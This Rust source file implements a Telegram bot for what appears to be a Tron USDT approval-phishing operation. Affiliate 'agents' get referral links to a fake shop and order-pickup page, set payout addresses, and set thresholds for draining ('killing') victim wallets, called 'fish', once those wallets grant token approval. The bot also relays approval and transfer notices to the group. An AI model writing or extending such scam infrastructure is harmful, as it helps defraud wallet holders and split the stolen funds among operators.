use crate::daili::daili_cache;
use crate::daili::daili_manager::{DEFAULT_THRESHOLD, DailiManager};
use crate::data_cache_manager::DataCacheManager;
use crate::fish::fish_manager::FishManager;
use crate::telegram_bot::fish_command::{CommandPattern, FishCommand, ParseFishCommandResult};
use crate::utils::common::{now_date_time_str, send_bot_message};
use crate::utils::tron::{is_valid_trc20_address, usdt_with_decimal};
use crate::{
    options::options_cache,
    telegram_bot::command::Command,
    tron::tron_block_scanner::TronBlockScanner,
    utils::{
        tron::{TronPublicKeyBundle, make_transaction_details_url, send_transaction},
    },
};
use kameo::{Actor, actor::ActorRef, error::RegistryError, mailbox::unbounded};
use reqwest::Client;
use rust_decimal::Decimal;
use rust_decimal::prelude::FromPrimitive;
use sea_orm::ActiveValue;
use std::str::FromStr;
use std::sync::Arc;
use teloxide::dptree::case;
use teloxide::types::{ParseMode, Recipient};
use teloxide::{
    Bot,
    dispatching::{HandlerExt, UpdateFilterExt},
    dptree,
    prelude::{Dispatcher, Requester, ResponseResult},
    types::{Message, Update},
    utils::command::BotCommands,
};
use thiserror::Error;
use tokio::task::JoinHandle;
use tracing::error;

#[derive(Debug, Error)]
pub enum TelegramBotManagerError {
    #[error("未配置Bot api key")]
    NoBotKey,
    #[error("registry error: {0}")]
    RegistryError(#[from] RegistryError),
    #[error("数据库错误: {0}")]
    DbConnError(String),
    #[error("依赖的服务没有启动: {0}")]
    DependentServiceNotStart(String),
}

pub(crate) struct TelegramBotManager {
    bot_handler: Option<JoinHandle<()>>,
    bot: Bot,
}

impl TelegramBotManager {
    pub(crate) fn init_bot() -> anyhow::Result<Bot> {
        let token = if let Some(key) = options_cache::map_bot_key(|m| m.value.clone()).flatten() {
            key
        } else {
            return Err(TelegramBotManagerError::NoBotKey.into());
        };

        let bot = teloxide::Bot::new(token);

        Ok(bot)
    }

    pub(crate) async fn spawn_link(
        supervisor: &ActorRef<impl Actor>,
        bot: Bot,
    ) -> anyhow::Result<ActorRef<Self>> {
        let manager = TelegramBotManager::new(bot);
        let actor_ref =
            Actor::spawn_link_with_mailbox(supervisor, manager, unbounded::<Self>()).await;
        let _ = actor_ref
            .wait_for_startup_with_result(|r| match r {
                Ok(_) => Ok(()),
                Err(e) => {
                    anyhow::bail!(format!("{e:?}"))
                }
            })
            .await?;

        Ok(actor_ref)
    }

    #[allow(unused)]
    pub async fn bot() -> anyhow::Result<Option<Bot>> {
        let me = Self::me()?;
        if let Some(actor_ref) = me {
            match actor_ref.ask(GetBotCmd).await {
                Ok(bot) => Ok(Some(bot)),
                Err(e) => anyhow::bail!("{e:?}"),
            }
        } else {
            Ok(None)
        }
    }

    #[allow(unused)]
    pub fn me() -> anyhow::Result<Option<ActorRef<Self>>> {
        let actor_ref = ActorRef::lookup(<Self as Actor>::name())?;

        Ok(actor_ref)
    }

    fn new(bot: Bot) -> TelegramBotManager {
        TelegramBotManager {
            bot_handler: None,
            bot,
        }
    }
}

impl Actor for TelegramBotManager {
    type Args = Self;

    type Error = TelegramBotManagerError;

    async fn on_start(
        mut args: Self::Args,
        actor_ref: kameo::prelude::ActorRef<Self>,
    ) -> Result<Self, Self::Error> {
        actor_ref.register(Self::name())?;
        args.start_bot(&actor_ref).await?;

        Ok(args)
    }
}

impl TelegramBotManager {
    async fn start_bot(
        &mut self,
        _actor_ref: &ActorRef<Self>,
    ) -> Result<(), TelegramBotManagerError> {
        error!("enter start bot");
        let mut deps = dptree::di::DependencyMap::new();
        deps.insert(Client::new());
        let db_conn = database::connection::get_connection()
            .await
            .map_err(|e| TelegramBotManagerError::DbConnError(format!("{:?}", e)))?;
        deps.insert(db_conn);

        let daili_manager = DailiManager::me().await?.ok_or_else(|| {
            TelegramBotManagerError::DependentServiceNotStart("DailiManager".to_string())
        })?;
        deps.insert(daili_manager);

        let fish_manager = FishManager::me().await?.ok_or_else(|| {
            TelegramBotManagerError::DependentServiceNotStart("FishManager".to_string())
        })?;
        deps.insert(fish_manager);

        let fish_command_patterns = Arc::new(super::fish_command::init_patterns());
        deps.insert(fish_command_patterns);

        let handler = dptree::entry()
            .branch(
                Update::filter_message()
                    .filter_map(
                        |msg: Message,
                         patterns: Arc<Vec<CommandPattern>>|
                         -> Option<ParseFishCommandResult> {
                            if let Some(text) = msg.text() {
                                FishCommand::parse(text, &patterns)
                            } else {
                                None
                            }
                        },
                    )
                    .branch(case![ParseFishCommandResult::Ok(cmd)].endpoint(
                        |bot: Bot,
                         message: Message,
                         fish_actor: ActorRef<FishManager>,
                         daili_actor: ActorRef<DailiManager>,
                         cmd: FishCommand| async move {
                            Self::handle_fish_command(bot, message, fish_actor, daili_actor, cmd)
                                .await
                        },
                    ))
                    .branch(case![ParseFishCommandResult::Err(reason)].endpoint(
                        |bot: Bot, message: Message, reason: String| async move {
                            send_bot_message(&bot, message.chat.id, reason, Some(ParseMode::Html))
                                .await;
                            Ok(())
                        },
                    )),
            )
            .branch(
                Update::filter_message()
                    .filter_command::<Command>()
                    .endpoint(Self::handle_command),
            )
            .branch(Update::filter_message().endpoint(Self::handle_message));
        let mut dispatcher = Dispatcher::builder(self.bot.clone(), handler)
            .dependencies(deps)
            .build();

        let handler = tokio::spawn(async move {
            error!("启动机器人");
            dispatcher.dispatch().await;
        });
        self.bot_handler.replace(handler);

        Ok(())
    }
}

impl TelegramBotManager {
    async fn handle_message(bot: Bot, msg: Message) -> ResponseResult<()> {
        if let Some(text) = msg.text() {
            bot.send_message(msg.chat.id, text).await?;
        }

        Ok(())
    }

    async fn handle_command(
        bot: Bot,
        msg: Message,
        command: Command,
        client: Client,
    ) -> ResponseResult<()> {
        match command {
            Command::Help => {
                bot.send_message(msg.chat.id, Command::descriptions().to_string())
                    .await?;
            }
            Command::Id => {
                bot.send_message(msg.chat.id, msg.chat.id.0.to_string())
                    .await?;
            }
            Command::Mint { to, amount } => {
                Self::handle_mint_command(bot, msg, client, to, amount).await?;
            }
            Command::ParseTronAddress(maybe_address) => {
                match anychain_tron::TronAddress::from_str(&maybe_address) {
                    Ok(addr) => {
                        let base58 = addr.to_base58();
                        let hex = addr.to_hex();
                        bot.send_message(msg.chat.id, format!("base58: {}, hex: {}", base58, hex))
                            .await?;
                        //
                    }
                    Err(e) => {
                        bot.send_message(msg.chat.id, format!("不是合法的Tron地址: {e:?}"))
                            .await?;
                    }
                }
            }
            Command::TestApproveNotice => {
                let now = now_date_time_str();
                let _ = TronBlockScanner::send_approve_bot_message_with_bot(
                    &bot,
                    msg.chat.id,
                    "test daili",
                    "Tskfjkdsjjl[Test]",
                    "TestPersmission",
                    "授权成功",
                    "授权成功",
                    Some(10000),
                    Some(100000),
                    &now,
                )
                .await;
            }
            Command::TestTransferNotice => {
                // 测试转帐通知
                let now = now_date_time_str();
                let _ = TronBlockScanner::send_transfer_fish_usdt_notice_with_bot(
                    &bot,
                    msg.chat.id,
                    "Fish Address",
                    &Some("测试代理".to_string()),
                    // &Some("代理收款地址".to_string()),
                    None,
                    1_000_000,
                    Some(1000000),
                    "tx_id",
                    &now,
                )
                .await;
            }
            Command::Reset => {
                let resp = if let Err(e) = DataCacheManager::tell_reset_data().await {
                    format!("重置数据失败: {e:?}")
                } else {
                    "重置数据成功".to_string()
                };
                bot.send_message(msg.chat.id, resp).await?;
            }
        }

        Ok(())
    }
}

impl TelegramBotManager {
    async fn handle_mint_command(
        bot: Bot,
        msg: Message,
        client: Client,
        to: String,
        amount: u64,
    ) -> ResponseResult<()> {
        let secret = options_cache::map_contract_owner_private_key(|m| m.value.clone()).flatten();
        let secret = match secret {
            Some(s) => s,
            None => {
                bot.send_message(msg.chat.id, "未配置授权地址密钥，将不会执行")
                    .await?;
                return Ok(());
            }
        };
        let owner_pubkey = match crate::utils::tron::private_key_2_public_key(&secret) {
            Ok(TronPublicKeyBundle { base58, .. }) => base58,
            Err(e) => {
                bot.send_message(
                    msg.chat.id,
                    format!("私钥转公钥出错：{e:?},命令将不会被执行"),
                )
                .await?;
                return Ok(());
            }
        };
        let block_brief = match crate::tron::block::get_block_brief().await {
            Some(b) => b,
            None => {
                bot.send_message(msg.chat.id, "还未初始化区块信息，命令不会被执行")
                    .await?;
                return Ok(());
            }
        };
        match crate::utils::tron::build_mint_test_usdt(
            &owner_pubkey,
            &to,
            amount,
            &block_brief,
            &secret,
        ) {
            Ok(tx) => {
                let ret = send_transaction(&client, tx).await;
                let full_host = &config_helper::CONFIG.tron.full_host;
                match ret {
                    Ok(resp) => {
                        if resp.success() {
                            let details_url = make_transaction_details_url(full_host, &resp.tx_id);
                            bot.send_message(
                                msg.chat.id,
                                format!(
                                    "命令执行成功, 交易id: {}, code: {:?}, 交易消息: {:?} url: {full_host}， 交易详情: {details_url}",
                                    resp.tx_id,
                                    resp.code,
                                    resp.message,
                                ),
                            )
                                .await?;
                        }
                    }
                    Err(e) => {
                        bot.send_message(
                            msg.chat.id,
                            format!("发送交易出错, url: {full_host}, 错误: {e:?}"),
                        )
                        .await?;
                    }
                }
            }
            Err(e) => {
                bot.send_message(
                    msg.chat.id,
                    format!("构建交易出错：{e:?}, 命令将不会被执行"),
                )
                .await?;
            }
        }

        Ok(())
    }

    async fn handle_fish_command(
        bot: Bot,
        msg: Message,
        fish_actor: ActorRef<FishManager>,
        daili_actor: ActorRef<DailiManager>,
        cmd: FishCommand,
    ) -> ResponseResult<()> {
        match cmd {
            FishCommand::ClassMode => {}
            FishCommand::Rules => {}
            FishCommand::Threshold(fish_address, threshold) => {
                Self::handle_threshold_command(
                    bot,
                    fish_actor,
                    msg,
                    fish_address,
                    Some(threshold),
                    false,
                )
                .await;
            }
            FishCommand::KillFish(_) => {}
            FishCommand::PaymentAddress(payment_address) => {
                Self::handle_update_payment_address(bot, msg, daili_actor, payment_address).await;
            }
            FishCommand::AutoThreshold(_) => {}
            FishCommand::GetPaymentAddress => {}
            FishCommand::GetFishInfo => {}
            FishCommand::GetAgentLink => {
                let _ = Self::handle_get_agent_link(bot, msg, daili_actor).await;
            }
            FishCommand::AdminQueryFish(_) => {}
            FishCommand::Payment(_) => {}
        }

        Ok(())
    }

    async fn handle_update_payment_address(
        bot: Bot,
        message: Message,
        daili_actor: ActorRef<DailiManager>,
        payment_address: String,
    ) {
        let from = if let Some(from) = message.from {
            from
        } else {
            error!("异常的Message：没有from数据");
            return;
        };
        let full_name = format!(
            "{} {}",
            from.first_name,
            from.last_name.as_ref().map(|s| s.as_str()).unwrap_or("")
        );
        let unique_id = daili_cache::map_by_user_id_group_id(
            &from.id.to_string(),
            &message.chat.id.to_string(),
            |m| m.unique_id.clone(),
        )
        .flatten();
        if let Some(unique_id) = unique_id {
            // 检查地址是否有效
            if is_valid_trc20_address(&payment_address) {
                let success_reply =
                    format!("✅ 收款地址设置成功！\n\n<code>{payment_address}</code>");
                if let Err(e) = DailiManager::update_payment_address_with_actor(
                    &daili_actor,
                    unique_id,
                    payment_address,
                )
                .await
                {
                    error!("更新代理付款地址出错: {e:?}");
                } else {
                    send_bot_message(&bot, message.chat.id, success_reply, Some(ParseMode::Html))
                        .await;
                }
            } else {
                send_bot_message(
                    &bot,
                    message.chat.id,
                    "❌ 无效的 TRC20 地址格式",
                    Some(ParseMode::Html),
                )
                .await;
                return;
            }
        } else {
            let text = format!(
                "
                🎣渔夫 <code>{full_name}</code> 你好！\n\n\
                📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。
                "
            );
            send_bot_message(&bot, message.chat.id, text, Some(ParseMode::Html)).await;
        }
    }

    async fn handle_threshold_command(
        bot: Bot,
        fish_manager: ActorRef<FishManager>,
        msg: Message,
        fish_address: String,
        threshold: Option<f64>,
        is_kill: bool,
    ) {
        // 检查值是否在范围内
        let threshold = threshold.unwrap_or(0.0);
        if !is_kill {
            if threshold < 10. || threshold > 1000000. {
                send_bot_message(
                    &bot,
                    msg.chat.id,
                    "❌ 阈值必须在10到1000000之间",
                    Some(ParseMode::Html),
                )
                .await;
                return;
            }
        }

        let from = if let Some(from) = msg.from {
            from
        } else {
            error!("收到[thresold]命令，但是没有[from]数据");
            return;
        };

        let chat_member = match bot.get_chat_member(msg.chat.id, from.id).await {
            Ok(member) => member,
            Err(e) => {
                error!("获取发送命令者的成员信息出错: {e:?}");
                return;
            }
        };

        // 管理员可以管理本群的鱼苗
        // 非管理员只能管理自己代理的鱼苗
        // 都只处理授权过的鱼苗
        let has_admin_permission = chat_member.is_owner() || chat_member.is_administrator();
        let (fish_id, unique_id) = if let Some((fish_id, unique_id, approved)) =
            crate::fish::fish_cache::map(&fish_address, |fish| {
                (fish.id, fish.unique_id.clone(), fish.auth_status == 1)
            }) {
            if !approved {
                send_bot_message(&bot, msg.chat.id, "❌ 鱼苗还未授权", Some(ParseMode::Html)).await;
                return;
            }
            if let Some(unique_id) = unique_id {
                (fish_id, unique_id)
            } else {
                error!("无法获取鱼的unique id: {fish_address}");
                return;
            }
        } else {
            error!("找不到鱼苗信息: {fish_address}");
            send_bot_message(
                &bot,
                msg.chat.id,
                "❌ 未找到该鱼苗的信息，请核对后重试。",
                Some(ParseMode::Html),
            )
            .await;
            return;
        };
        // 检查是否有权限进行操作
        if has_admin_permission {
            //只需要检查是否是本群的鱼苗
            let can_operate = daili_cache::map(&unique_id, |daili| {
                if let Some(group_id) = daili.groupid.as_ref() {
                    group_id == &msg.chat.id.to_string()
                } else {
                    false
                }
            })
            .unwrap_or(false);
            if !can_operate {
                Self::send_can_not_threshold(&bot, msg.chat.id, is_kill).await;
                return;
            }
        } else {
            // 检查是否是自己代理的鱼苗
            let can_operate = daili_cache::map(&unique_id, |daili| {
                if daili.tguid == from.id.to_string() {
                    if let Some(group_id) = daili.groupid.as_ref() {
                        group_id == &msg.chat.id.to_string()
                    } else {
                        false
                    }
                } else {
                    false
                }
            })
            .unwrap_or(false);
            if !can_operate {
                Self::send_can_not_threshold(&bot, msg.chat.id, is_kill).await;
                return;
            }
        }
        if is_kill {
            // todo: kill fish
        } else {
            let threshold_with_decimal = Decimal::from_f64(threshold);
            if let Some(threshold_with_decimal) = threshold_with_decimal {
                let am = entities::entities::fish::ActiveModel {
                    id: ActiveValue::Set(fish_id),
                    threshold: ActiveValue::Set(Some(threshold_with_decimal)),
                    ..Default::default()
                };
                // let ret = am.update(&db_conn).await;
                if let Err(e) = FishManager::update_fish_with_actor(&fish_manager, am).await {
                    let text = if is_kill {
                        error!("杀鱼时出错错误: {e:?}");
                        "❌ 杀鱼时出现错误，请联系管理"
                    } else {
                        error!("修改阈值时出错错误: {e:?}");
                        "❌ 修改阈值时出现错误，请联系管理"
                    };
                    send_bot_message(&bot, msg.chat.id, text, Some(ParseMode::Html)).await;
                }
            } else {
                error!("修改阈值出现错误：{threshold}无法转换为Decimal");
                send_bot_message(
                    &bot,
                    msg.chat.id,
                    "❌ 修改阈值时出现错误: 阈值不是一个有效值，请进行检查",
                    Some(ParseMode::Html),
                )
                .await;
            }
        }
    }

    async fn send_can_not_threshold(bot: &Bot, recipient: impl Into<Recipient>, is_kill: bool) {
        let text = if is_kill {
            "❌ 您没有权限杀此鱼苗"
        } else {
            "❌ 您没有权限修改此鱼苗的阈值"
        };
        send_bot_message(&bot, recipient, text, Some(ParseMode::Html)).await;
        return;
    }

    // async fn check_group_admin_status<C>(bot: &Bot, chat_id: C, user_id: UserId) -> anyhow::Result<bool>
    // where
    //     C: Into<Recipient>
    // {
    //     let chat_member = bot.get_chat_member(chat_id, user_id).await?;
    //     // let chat_admin = bot.get_chat_administrators(chat_id).await?;
    //
    //     Ok(false)
    //
    // }

    async fn handle_get_agent_link(
        bot: Bot,
        msg: Message,
        daili_actor: ActorRef<DailiManager>,
    ) -> ResponseResult<()> {
        error!("handle get agent link");
        let from = if let Some(from) = &msg.from {
            from
        } else {
            if let Err(e) = bot.send_message(msg.chat.id, "❌ 异常，找不到发送者").await {
                error!("发送机器人消息失败: {e:?}");
            }

            return Ok(());
        };
        let user_id = from.id.to_string();
        let user_name = if let Some(user_name) = &from.username {
            user_name
        } else {
            if let Err(e) = bot
                .send_message(msg.chat.id, "❌ 请先创建你的用户名才能继续申请代理链接")
                .await
            {
                error!("发送机器人消息失败: {e:?}");
            }
            return Ok(());
        };
        let full_name = format!(
            "{} {}",
            from.first_name,
            from.last_name
                .as_ref()
                .map(|s| s.as_ref())
                .unwrap_or_else(|| "")
        );

        if msg.chat.id.0 > 0 {
            send_bot_message(
                &bot,
                msg.chat.id,
                "此命令只能在群组中使用",
                Some(ParseMode::Html),
            )
            .await;
            return Ok(());
        }

        let group_id = msg.chat.id.to_string();

        // 创建或者更新代理
        let unique_id = match DailiManager::create_or_update_with_actor(
            &daili_actor,
            user_id,
            group_id,
            user_name.to_string(),
            full_name.clone(),
        )
        .await
        {
            Ok(id) => id,
            Err(e) => {
                error!("创建或者更新代理出错: {e:?}");
                if let Err(e) = bot
                    .send_message(msg.chat.id, "❌ 创建代理记录时出现错误，请联系管理员。")
                    .await
                {
                    error!("通知更新代理出错失败:{e:?}");
                }
                return Ok(());
            }
        };

        let info = daili_cache::map(&unique_id, |daili| {
            (
                daili.threshold.unwrap_or(DEFAULT_THRESHOLD),
                daili
                    .payment_address
                    .clone()
                    .unwrap_or_else(|| "当前未设置，可使用【收款地址】进行设置".to_string()),
            )
        });
        let (threshold, payment_address) = if let Some(info) = info {
            info
        } else {
            send_bot_message(
                &bot,
                msg.chat.id,
                "代理数据异常：创建或者更新代理成功，但无法获取数据",
                Some(ParseMode::Html),
            )
            .await;
            return Ok(());
        };
        let threshold_with_decimal = usdt_with_decimal(threshold as i128);
        let main_domain = options_cache::main_domain();
        let main_domain = main_domain.as_ref().map(|s| s.as_str()).unwrap_or("");
        let id_param = format!("?id=trc{unique_id}");

        // todo: 返回相关信息
        // todo: 收款地址
        let text = format!(
            "🎣渔夫 <code>{full_name}</code> 你好！\n\n\
             ⚜️授权成功后自动设置阈值：<code>{threshold_with_decimal} USDT</code>\n\n\
             <pre><code class='language-💰您的杀鱼自动分润地址：'>{payment_address}</code></pre>\n\n\
            📥请复制保存您的 <code>TRC</code> 专属推广链接\n\n\
            🛒 商城链接:\n\
            ———————————\n\
            🔗 <a href='{main_domain}/{id_param}'><u>点击访问商城</u></a>\n\
            ———————————\n\n\
            📦 提货:\n
           商品信息:\n
           订单状态:已下单,待提货\n
           🔗 <a href='{main_domain}/buy/1{id_param}'><u>提货链接</u></a>\n\n
            "
        );

        send_bot_message(&bot, msg.chat.id, text, Some(ParseMode::Html)).await;

        Ok(())
        // todo 检查代理是否存在，不存在则创建
    }
}

struct GetBotCmd;

impl kameo::message::Message<GetBotCmd> for TelegramBotManager {
    type Reply = Result<Bot, ()>;

    async fn handle(
        &mut self,
        _msg: GetBotCmd,
        _ctx: &mut kameo::prelude::Context<Self, Self::Reply>,
    ) -> Self::Reply {
        Ok(self.bot.clone())
    }
}
